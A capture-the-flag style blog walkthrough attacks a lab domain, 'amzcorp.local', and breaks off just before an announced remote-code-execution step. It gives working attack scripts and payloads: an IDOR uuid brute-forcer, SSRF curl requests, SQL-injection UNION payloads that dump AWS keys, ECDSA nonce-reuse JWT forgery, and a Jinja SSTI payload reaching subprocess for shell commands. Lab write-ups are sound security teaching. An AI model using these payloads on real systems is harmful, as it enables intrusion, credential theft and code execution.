---
title: WEB - Amazon Web Services (AWS) 
published: 2025-08-20
description: This post covers my process of exploiting Amazon Web Services (AWS) — a customizable vulnerable lab, hosted by AWS.
image: "./aws_logo.png"
tags: [redteam, AWS, real-life, pentest]
category: Web Exploitation
draft: false
---

# Amazon Web Services

# Recon

## Rustscan + Nmap:

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ rustscan -a 10.13.37.15 -- -A

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.52 ((Win64))
|_http-server-header: Apache/2.4.52 (Win64)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-14 14:03:22Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: amzcorp.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49688/tcp open  unknown       syn-ack ttl 127
61548/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64351/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

- Hostname: DC01
- Domain: amzcorp.local

## SMB enum:

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ nxc smb 10.13.37.15                              
SMB         10.13.37.15     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)

┌──(I3isk3t㉿kali)-[~]
└─$ smbclient -L \\\\10.13.37.15\\ 
Password for [WORKGROUP\I3isk3t]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.13.37.15 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## DNS enum:

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ gobuster dns -d amzcorp.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r 10.13.37.15
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     amzcorp.local
[+] Threads:    10
[+] Resolver:   10.13.37.15
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: jobs.amzcorp.local
Found: gc._msdcs.amzcorp.local
Found: domaindnszones.amzcorp.local
Found: forestdnszones.amzcorp.local
Found: [company-support.amzcorp.local](http://company-support.amzcorp.local/)

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

- jobs.amzcorp.local
- gc._msdcs.amzcorp.local
- domaindnszones.amzcorp.local
- forestdnszones.amzcorp.local

## Vhost enum:

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.13.37.15 -H "Host: FUZZ.amzcorp.local" -fs 86

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.13.37.15
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.amzcorp.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 86
________________________________________________

jobs                    [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 279ms]
cloud                   [Status: 403, Size: 309, Words: 10, Lines: 8, Duration: 279ms]
inventory               [Status: 200, Size: 6675, Words: 713, Lines: 319, Duration: 426ms]
:: Progress: [4989/4989] :: Job [1/1] :: 38 req/sec :: Duration: [0:00:52] :: Errors: 0 ::
```

- jobs.amzcorp.local
- cloud.amzcorp.local
- inventory.amzcorp.local

After enumerating subdomain/vhosts and directories, add those into **/etc/hosts** file, I accessed to `http://amzcorp.local/` and it automatically redirected to `http://jobs.amzcorp.local/login`.

<img width="1414" height="946" alt="c74eb6e6-e033-4143-a57b-be836802bffd" src="https://github.com/user-attachments/assets/f8fe4fb6-3f10-408e-862e-7e05ad3c64b9" />  

And register with the folllowing information:

- username: testquan
- email: testquan@gmail.com
- password: testquan

This is what it looks like when I logged into:

<img width="1916" height="946" alt="image" src="https://github.com/user-attachments/assets/a2318cb5-43f1-4092-b315-9890ca34193d" />  

When reading page source, I found the **app.js** file:

<img width="498" height="90" alt="43a93769-da63-43aa-8f41-d52afdea5be6" src="https://github.com/user-attachments/assets/bef74ccf-cc54-49ec-ae99-32be9a17943a" />  

It was obfuscated into something like JSFuck:

<img width="898" height="176" alt="6d070bc2-c492-4750-95b8-0cf9d6f76afd" src="https://github.com/user-attachments/assets/905a2a6e-5e6c-466f-b401-f89a78160327" />  

I used **[de4js](https://de4js.kshift.me/)** to deobfuscator:

<img width="1335" height="876" alt="image 1" src="https://github.com/user-attachments/assets/127f93a8-aee0-4ccf-a11e-46298217076f" />

# **Early Access**

While reading file **app.js**, I found something interesting here, in `GetToken()` function:

<img width="767" height="481" alt="image 2" src="https://github.com/user-attachments/assets/a2795076-924f-4ed7-ac90-38c63e1b0dbd" />  

In this part, `uuid` and `username` is **untrusted data** from user input. Server processes the request and returns a token based on the given **uuid/username** without checking if they are belong to the user in the session cookie:

```bash
var uuid = document.getElementById('uuid');
var username = document.getElementById('username');
```

Payload from client i

```bash
{"get_token":"True","uuid":"<client-controlled>","username":"<client-controlled>"}
```

This means that if we know or can guess someone else’s **uuid**, I can bruteforce **uuid** and request their token using this script:

```bash
import sys, base64, requests
from pwn import log as pwlog

progress_bar = pwlog.progress("uuid-check")

endpoint = "http://jobs.amzcorp.local/api/v4/tokens/get"

cookie_jar = {
    "session": ".eJxNjrtOBDEMRf8lNUJJnMTxVvwE9cixHVixM6OdR4X4dzKiobPvQ_d8u6lvtn-627Gd9uKmu7qbK-aZmvoqSBS0ASBBI4811Fh9V68ctWHzqRYE7lIld5NOyWcskkkgA4pywZhUW2TKPiUPUEoPkBh7DkY5Y-hVWlULKWn1lIuaihsg527bHw3lOgTZtz4d65ctF2BJmcGiT2KdqXPlGosnKSWjAQFi0XGMns18f4zKYfvxPHl5-7iEV1nnYW7rw4b3Prb28V6bC8_2L-5-fgFh4FXO.aKKxtw.w6Y_dFa3zDVeVPfiDPQH6DBIGg0"
}

http_headers = {
    "Content-Type": "application/json"
}

for num_id in range(1000):
    raw_str = f'{{"get_token": "True", "uuid": "{num_id}", "username": "testquan"}}'
    b64_str = base64.b64encode(raw_str.encode("utf-8")).decode("utf-8")
    payload_to_send = {"data": b64_str}

    resp = requests.post(
        endpoint,
        headers=http_headers,
        cookies=cookie_jar,
        json=payload_to_send
    )

    progress_bar.status(str(num_id))

    if "Invalid" not in resp.text:
        print(resp.text.strip())
        progress_bar.success(str(num_id))
        sys.exit(0)

```

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ python3 IDOR.py  
[+] uuid-check: 955
{
  "flag": "AWS{S1mPl3_iD0R_4_4dm1N}", 
  "token": "98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a", 
  "username": "testquan", 
  "uuid": "955"
}
```

# **Inspector**

In the `GetLogData()` function, there is an internal service `logs.amzcorp.local` :

<img width="718" height="293" alt="image 3" src="https://github.com/user-attachments/assets/92a68773-c5e8-41c8-9102-30c6d705cafe" />  

After obtaining the admin token in the first step, it is possible to exploit SSRF by using that token to get `/status`, pointing it to `logs.amzcorp.local`. The server will return internal logs because it can be made to fetch resources from `logs.*` on behalf of the `jobs.*` server:

```bash
┌──(I3isk3t㉿kali)-[~/Documents]
└─$ curl -s http://jobs.amzcorp.local/api/v4/status -d '{"url": "http://logs.amzcorp.local"}' -b 'api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a' -H 'Content-Type: application/json' -o logs.txt
```

<img width="884" height="326" alt="image 4" src="https://github.com/user-attachments/assets/bc86aabc-f4fe-4eea-956b-a0d6014133b0" />  

In this file, I caught some sus domain like this, it end with `.c00.xyz` and the first part may have been decoded with base64:

<img width="515" height="129" alt="image 5" src="https://github.com/user-attachments/assets/e1ac06c9-7be5-4c8a-8f24-622d5a581b73" />  

I meant, yes I was right about that sus `domain.c00.xyz`:

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ echo "Z2FtZXM6KjoxODkwNjowOjk5OTk5Ojc6OjoK" | base64 -d
games:*:18906:0:99999:7:::
```

I used this script to extract the label before `.c00.xyz`, base64-decode it, pray and hope to find the flag while using grep `AWS{…}` to find the flag:

```bash
import re, base64

with open("logs.txt", "r", encoding="utf-8", errors="replace") as f:
    s = f.read()

labels = re.findall(r'([^"\\/\s]+)\.c00\.xyz', s)

decoded = []
for lab in labels:
    t = lab.strip()

    t += "=" * (-len(t) % 4)
    for fn in (base64.b64decode, base64.urlsafe_b64decode):
        try:
            decoded.append(fn(t))
            break
        except Exception:
            continue

with open("decoded.bin", "wb") as out:
    for blob in decoded:
        out.write(blob)
        out.write(b"\n" + b"-" * 40 + b"\n")
```

```bash
┌──(I3isk3t㉿kali)-[~/Documents/htb]
└─$ cat decoded.bin                     
audio:x:29:
----------------------------------------
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
----------------------------------------
....
----------------------------------------
AWS{F1nD1nG_4_N33dl3_1n_h4y5t4ck}
----------------------------------------
....
----------------------------------------
dialout:x:20:
----------------------------------------
```

# Explore logs.txt

- company-support.amzcorp.local
- jobs-development.amzcorp.local

I got something interesting while dumping those thing from a Linux **`/etc/shadow`** file:

```bash
tom:$6$uUyJe0OuP6ef7rWH$OJ6QE0M.viY.fay4hJuwTrEiOEZoH7yhrlErjBM/VxiikK7PkLibf8xbQiogWiVvHOH8mEG1ItylF36eTxMpz/:19032:0:99999:7:::
```

And a leaked information including **username/password** of user `tyler`:

<img width="1141" height="267" alt="image 6" src="https://github.com/user-attachments/assets/7df25f52-5bc2-4d4b-b4e0-45df6eb387ce" />  

```bash
  {
    "hostname": "jobs.amzcorp.local", 
    "ip_address": "172.21.10.12", 
    "method": "GET", 
    "requester_ip": "36.101.23.69", 
    "url": "/forgot-passsword/step_two/?username=tyler&email=tyler@amzcorp.local&password=%7BpXDWXyZ%26%3E3h%27%27W%3C"
  }, 
```

- `tyler@amzcorp.local`
- `{pXDWXyZ&>3h''W<` (URL-decode)

Look up things:

<img width="1149" height="199" alt="image 7" src="https://github.com/user-attachments/assets/f503b7f5-735f-41f9-8dfb-3b998309c82a" />  

```bash
{
	"hostname": "jobs-development.amzcorp.local",
	"ip_address": "172.21.10.11",
	"method": "GET",
	"requester_ip": "129.141.123.251",
	"url": "/.git"
}
```

# **Statement**

Explore `jobs-development.amzcorp.local`, in **logs.txt** we can see that the path accessed was `/.git`, which tells us that there is an existing Git project:

<img width="795" height="657" alt="image 8" src="https://github.com/user-attachments/assets/5ecf2c93-6f01-470a-bbed-6a2c97b5fcc3" />  

In the `jobs_portal` folder we can see the web config, an API `/api/v4/user/edit` that allows `Managers` to update a user to **`Administrators` :**

<img width="1218" height="951" alt="image 9" src="https://github.com/user-attachments/assets/c3b644a1-24fd-46ae-ab54-0dba22205a35" />  

And now, the problem is how to get Managers role?

I tried login to account `tyler@amzcorp.local` / `{pXDWXyZ&>3h''W<` ****which I found in file **logs.txt** hope to find something here:

<img width="1914" height="937" alt="image 10" src="https://github.com/user-attachments/assets/d094b01b-ccc7-45b0-8df9-5ebd5f8ca51d" />  

In the portal, I could not find any informations if this user is a manager or not, so I collected this user `session` , decode it using this script:

```bash
import base64, zlib, json

def decode_flask_cookie(cookie: str):
    data = cookie.lstrip(".")
    padded = data + "=" * ((4 - len(data) % 4) % 4)
    raw = base64.urlsafe_b64decode(padded)
    decoded = zlib.decompress(raw)
    return json.loads(decoded.decode())

cookie = ".eJw1jklOQzEQRO_iNUKe3Z0VF-AMUbsHiPhD5J8sAHF3HCGWXaVX_b7d2YYe7-50G3d9cueLuJOr6gm7eOCGGKSn1DB19A0CRPAmXihKb91nqC2RMXAxZcPsS6tckFNJjYVqi1mkR8Lic_Yp1WohZWpWgmIpLRhwB9GQs4DHUkWF3RS5Hzr-bOI8-Rh2vu0fuj0CnUtATCFHqNAzUKgIKJI4itiUpIxmk9OVLstEbp-Ljhdav3gf1-dlZ1pmO_ZFZ_lKG73pOGby-LrRqv-I-_kFOAxV-g.aKLAfA.gxzact6ymgfkyBmQcQ2jjuDyaYg"

payload = decode_flask_cookie(cookie)

print(json.dumps(payload, indent=4, ensure_ascii=False))
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ python3 decode.py 
{
    "_fresh": true,
    "_id": "6e0a9bd08c7991db33793b907818280fd0da2db7b048673afc8c5fecf940576c59c3537cda6724ddb2a9504403366f134a7f51e95571f8cb8de144d80956dedc",
    "_user_id": "2",
    "csrf_token": "2e4038aca142868b48a16989dd3c2ddf182a49ff",
    "email": "tyler@amzcorp.local",
    "role": "Managers",
    "username": "tyler"
}

```

Okay, now I know this user is a manager, I use this user session to edit my role up to Administrators:

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ curl -s http://jobs.amzcorp.local/api/v4/users/edit -d '{"update_user": "'$(echo '{"username":"testquan","email":"testquan@gmail.com","role":"Administrators"}' | base64 -w0
)'"}' -b 'api_token=98d7f87065c5242ef5d3f6973720293ec58e434281e8195bef26354a6f0e931a1fd50a72ebfc8ead820cb38daca218d771d381259fd5d1a050b6620d1066022a' -b 'session=.eJw1jklOQzEQRO_iNUKe3Z0VF-AMUbsHiPhD5J8sAHF3HCGWXaVX_b7d2YYe7-50G3d9cueLuJOr6gm7eOCGGKSn1DB19A0CRPAmXihKb91nqC2RMXAxZcPsS6tckFNJjYVqi1mkR8Lic_Yp1WohZWpWgmIpLRhwB9GQs4DHUkWF3RS5Hzr-bOI8-Rh2vu0fuj0CnUtATCFHqNAzUKgIKJI4itiUpIxmk9OVLstEbp-Ljhdav3gf1-dlZ1pmO_ZFZ_lKG73pOGby-LrRqv-I-_kFOAxV-g.aKLAfA.gxzact6ymgfkyBmQcQ2jjuDyaYg' -H 'Content-Type: application/json'  
{
  "success": "User updated successfully"
}
```

Logout and login my account again.

<img width="1914" height="944" alt="image 11" src="https://github.com/user-attachments/assets/2107c3d0-fb02-45e9-8b8d-423ea6f73e36" />  

<img width="1914" height="935" alt="image 12" src="https://github.com/user-attachments/assets/d573e49f-db62-4a36-bf77-a7fdc1550df4" />  


In this part, the first thing come up to my brain is **SQLi**, so I check source code again:

```bash
@blueprint.route('/admin/users/search', methods=['POST'])
@login_required
def search_user():
    if session['role'] == "Administrators":
        blacklist = ["0x", "**", "ifnull", " or ", "union"]
        username = request.form.get('username')
        if username:
            try:
                conn = connect_db()
                cur = conn.cursor()
                cur.execute('SELECT id, username, email, account_status, role FROM `Users` WHERE username=\'%s\'' % (username))
                row = cur.fetchone()
                conn.commit()
                conn.close()
                all_roles = Role.query.all()
                row = ""
                return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
            except sqlite3.DataError:
                all_roles = Role.query.all()
                row = ""
                return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
            except sqlite3.OperationalError:
                all_roles = Role.query.all()
                row = ""
                return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
            except sqlite3.Warning:
                all_roles = Role.query.all()
                row = ""
                return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
            except UndefinedError:
                all_roles = Role.query.all()
                row = ""
                return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
        else:
            all_roles = Role.query.all()
            row = ""
            return render_template('home/search.html', row=row, segment="users", all_roles=all_roles)
    else:
        return render_template('home/403.html')
```

- blacklist = ["0x", "**", "ifnull", " or ", "union"]
- Easy bypass blacklist using case-sensitive.
- ⇒  SQL injection.
1. Narrow down (pinpoint) the number of columns **C** before attempting a **Union Select:**

```bash
testquan' order by 5-- - 
```

<img width="1913" height="941" alt="image 13" src="https://github.com/user-attachments/assets/f6955fad-91e3-4033-b215-afd2544389b6" />  

1. List all table names in current database:

```bash
' Union Select NULL,group_concat(table_name),NULL,NULL,NULL From information_schema.tables Where table_schema=database()-- - 
```

<img width="1915" height="938" alt="image 14" src="https://github.com/user-attachments/assets/c6ec1369-bd74-45fb-b98c-5f231c653d8d" />  

1. List all databases on the server:

```bash
' Union Select NULL,group_concat(schema_name),NULL,NULL,NULL From information_schema.schemata-- - 
```

<img width="1914" height="937" alt="image 15" src="https://github.com/user-attachments/assets/7ec33733-677c-482d-bbc3-fc7df8d060b0" />  

- information_schema,jobs,performance_schema,mysql,sys
1. List all tables inside the **jobs** database:

```bash
' Union Select NULL,group_concat(table_name),NULL,NULL,NULL From information_schema.tables Where table_schema='jobs'-- -
```

<img width="1913" height="936" alt="image 16" src="https://github.com/user-attachments/assets/635270d6-42d9-4982-a908-c2aef68c0510" />  

- profiles,application,role,Users,position,keys_tbl,inventory
1. List the columns of the table **keys_tbl**:

```bash
' Union Select NULL,group_concat(column_name),NULL,NULL,NULL From information_schema.columns Where table_schema='jobs' And table_name='keys_tbl'-- - 
```

<img width="1912" height="938" alt="image 17" src="https://github.com/user-attachments/assets/8ad516ce-5362-48a9-83af-9237ed13fc48" />  

- id,key_name,key_value
1. Dump the entire **keys_tbl** table in the format **id:key_name:key_value**:

```bash
' Union Select NULL,group_concat(id,':',key_name,':',key_value),NULL,NULL,NULL From keys_tbl-- - 
```

<img width="1915" height="937" alt="image 18" src="https://github.com/user-attachments/assets/4ae95023-aa71-4086-9ca4-06eba5f88a60" />  

- 1:AWS_ACCESS_KEY_ID:AKIA3G38BCN8SCJORKFL,2:AWS_SECRET_ACCESS_KEY:GMTENUBiGygBeyOc+GpXsOfbQFfa3GGvpvb1fAjf,3:FLAG:**AWS{MySqL_T1m3_B453d_1nJ3c71on5_4_7h3_w1N}**

# Relentless

Earlier I found a subdomain **company-support:** `company-support.amzcorp.local` with a login page, I created an account and login but it returned **Access denied**:

<img width="1915" height="936" alt="image 19" src="https://github.com/user-attachments/assets/245601e6-5537-4a6d-958b-0b4617255916" />  

In source code I dumped from `/.git` , I need to create a code from my username and password using **URLSafeSerializer**, and send it to `/confirm_account` :

```bash
@blueprint.route('/confirm_account/<secretstring>', methods=['GET', 'POST'])
def confirm_account(secretstring):
    s = URLSafeSerializer('serliaizer_code')
    username, email = s.loads(secretstring)

    user = Users.query.filter_by(username=username).first()
    user.account_status = True
    db.session.add(user)
    db.session.commit()

    #return redirect(url_for("authentication_blueprint.login", msg="Your account was confirmed succsessfully"))
    return render_template('accounts/login.html',
                        msg='Account confirmed successfully.',
                        form=LoginForm())
```

Easy using this simple script:

```bash
from itsdangerous import URLSafeSerializer
string = URLSafeSerializer('serliaizer_code').dumps(["testquan", "testquan"])
print(string)
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ python3 url.py
WyJ0ZXN0cXVhbiIsInRlc3RxdWFuIl0.yRVvL3ptf5GtUqIMqS-M5CbnnNk
```

<img width="1914" height="939" alt="image 20" src="https://github.com/user-attachments/assets/a1c9ac4b-2518-4d78-8c6a-67ba568f7b36" />  

I login to my account again:

<img width="1913" height="938" alt="image 21" src="https://github.com/user-attachments/assets/d1da9170-ce0e-461c-9e18-c17c864a83c4" />  

- I can create a ticket
- Tony will handle it

In file `custom_jwt.py` :

```bash
import base64
from ecdsa import ellipticcurve
from ecdsa.ecdsa import curve_256, generator_256, Public_key, Private_key, Signature
from random import randint
from hashlib import sha256
from Crypto.Util.number import long_to_bytes, bytes_to_long
import json

G = generator_256
q = G.order()
k = randint(1, q - 1)
d = randint(1, q - 1)
pubkey = Public_key(G, G*d)
privkey = Private_key(pubkey, d)

def b64(data):
    return base64.urlsafe_b64encode(data).decode()

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def sign(msg):
    msghash = sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    _sig = (sig.r << 256) + sig.s
    return b64(long_to_bytes(_sig)).replace("=", "")

def verify(jwt):
    _header, _data, _sig = jwt.split(".")
    header = json.loads(unb64(_header))
    data = json.loads(unb64(_data))
    sig = bytes_to_long(unb64(_sig))
    signature = Signature(sig >> 256, sig % 2**256)
    msghash = bytes_to_long(sha256((f"{_header}.{_data}").encode()).digest())
    if pubkey.verifies(msghash, signature):
        return True
    return False

def decode_jwt(jwt):
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

def create_jwt(data):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}".replace("=", ""))
    jwt = f"{_header}.{_data}.{_sig}"
    jwt = jwt.replace("=", "")
    return jwt
```

- private key **d** and nonce **k** are random each time run → not secure.
- `create_jwt` function uses **ECDSA** to sign cookies (JWT)

Focus on this:

```bash
k = randint(1, q - 1)
d = randint(1, q - 1)
pubkey = Public_key(G, G*d)
privkey = Private_key(pubkey, d)
```

- **Nonce reuse in ECDSA**: if the same nonce kkk is reused to sign two different messages → the private key ddd can be completely recovered.
- **ECDSA formula**:

$$
 ⁍
$$

- With two different signatures but using the same kkk, we can compute:

$$
⁍
$$

$$
⁍
$$

- Therefore, only 2 valid JWTs are enough → the private key can be derived.

Use `decode_jwt` function in source, I have a script to decode the JWT, test it:

```bash
import base64, json

def unb64(data: str) -> bytes:
    return base64.urlsafe_b64decode(data + "=" * (4 - len(data) % 4))

def decode_jwt(jwt: str) -> dict:
    """Decode JWT and return payload (data)"""
    _header, _data, _sig = jwt.split(".")
    data = json.loads(unb64(_data))
    return data

if __name__ == "__main__":
    jwt = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3RxdWFuIiwiZW1haWwiOiJ0ZXN0cXVhbkBnbWFpbC5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.C7UV_Vd_CxaMe1IENf44Kcn-dCxqhNFLkVBTQhkJR3wGTQMxiOmYVO3g0oP68TP7qNe9aITk4iXlkiaFbTS6Rg"
    print(decode_jwt(jwt))
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ python3 decode1.py
{'username': 'testquan', 'email': 'testquan@gmail.com', 'account_status': True}
```

Okay, now my job is register two users to obtain two different JWTs, extract (r, s, h) , recover k and d, rebuiled the private key from d, and forge a tony’s jwt.

Full script forge tony’s jwt:

```bash
import base64, json, hashlib
from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse

def b64(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def unb64(data):
    l = len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * (4 - l))

def split_jwt(jwt):
    head, data, sig = jwt.split(".")
    msg = f"{head}.{data}"
    h = bytes_to_long(hashlib.sha256(msg.encode()).digest())
    sig_val = bytes_to_long(unb64(sig))
    sig = Signature(sig_val >> 256, sig_val % (2**256))
    return head, data, msg, h, sig

def recover_keys(jwt1, jwt2):
    _, _, _, h1, sig1 = split_jwt(jwt1)
    _, _, _, h2, sig2 = split_jwt(jwt2)

    r1, s1 = sig1.r, sig1.s
    r2, s2 = sig2.r, sig2.s

    q = generator_256.order()
    k = ((h1 - h2) * inverse(s1 - s2, q)) % q
    d = ((s1 * k - h1) * inverse(r1, q)) % q

    return k, d

def sign(msg, privkey, k):
    msghash = hashlib.sha256(msg.encode()).digest()
    sig = privkey.sign(bytes_to_long(msghash), k)
    sig_val = (sig.r << 256) + sig.s
    return b64(long_to_bytes(sig_val))

def create_jwt(data, privkey, k):
    header = {"alg": "ES256"}
    _header = b64(json.dumps(header, separators=(',', ':')).encode())
    _data = b64(json.dumps(data, separators=(',', ':')).encode())
    _sig = sign(f"{_header}.{_data}", privkey, k)
    return f"{_header}.{_data}.{_sig}"

if __name__ == "__main__":
    jwt1 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3RxdWFuIiwiZW1haWwiOiJ0ZXN0cXVhbkBnbWFpbC5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.C7UV_Vd_CxaMe1IENf44Kcn-dCxqhNFLkVBTQhkJR3wGTQMxiOmYVO3g0oP68TP7qNe9aITk4iXlkiaFbTS6Rg"
    jwt2 = "eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QxMzM3IiwiZW1haWwiOiJ0ZXN0MTMzN0BnbWFpbC5jb20iLCJhY2NvdW50X3N0YXR1cyI6dHJ1ZX0.C7UV_Vd_CxaMe1IENf44Kcn-dCxqhNFLkVBTQhkJR3xX_TVTTkLtcPlqPBUPGBz7Br5MK_V_eWW6J7UFBiZ_xw"

    k, d = recover_keys(jwt1, jwt2)
    print("[+] Recovered k =", k)
    print("[+] Recovered d =", d)

    G = generator_256
    pubkey = Public_key(G, G * d)
    privkey = Private_key(pubkey, d)

    target_data = {
        "username": "tony",
        "email": "tony@amzcorp.local",
        "account_status": True
    }
    forged_jwt = create_jwt(target_data, privkey, k)
    print("[+] Forged JWT for tony:\n")
    print(forged_jwt)
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ python3 exploit.py
[+] Recovered k = 19854092516489233696285450598150334498439376556935887292563364618160126731368
[+] Recovered d = 51322236806165564634438589421522373944846308332289035326530879155654487637724
[+] Forged JWT for tony:

eyJhbGciOiJFUzI1NiJ9.eyJ1c2VybmFtZSI6InRvbnkiLCJlbWFpbCI6InRvbnlAYW16Y29ycC5sb2NhbCIsImFjY291bnRfc3RhdHVzIjp0cnVlfQ.C7UV_Vd_CxaMe1IENf44Kcn-dCxqhNFLkVBTQhkJR3yEnwvcCaAp1zPag_6Niku5ximrABSxCGZAthIm5bO45A
```

Replace with the new jwt:

<img width="1166" height="326" alt="image 22" src="https://github.com/user-attachments/assets/c4e19957-81ea-4afd-b632-f97beeaeba3a" />  

And here it is:

<img width="1912" height="928" alt="image 23" src="https://github.com/user-attachments/assets/eab6457c-c9e7-4715-be5f-72146e2570b0" />  

Normally with a web that have ticket opening functionality like this there will be SSTI vulnerabilities if the input is not filtered, I will test to see if it works:

<img width="663" height="345" alt="image 24" src="https://github.com/user-attachments/assets/50653071-f4c4-41d3-b348-f8e75575cc59" />  

- It is vulnerable to SSTI on both input fields.

I found a [payload](https://www.cnblogs.com/glodears/p/18214431) that break out of the template sandbox, enumerate Python object subclasses, reach `subprocess.Popen`, and then execute the command provided via the `cmd` parameter with shell access:

<img width="932" height="420" alt="image 25" src="https://github.com/user-attachments/assets/c3740c7f-625d-4ccc-8634-04250385e57b" />  

- `{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}`

<img width="1913" height="933" alt="image 26" src="https://github.com/user-attachments/assets/5a93d1c5-d39f-4d00-8fbe-07097bdc379d" />  

Alright, let’s go RCE it!!!

```bash
┌──(I3isk3t㉿kali)-[~]
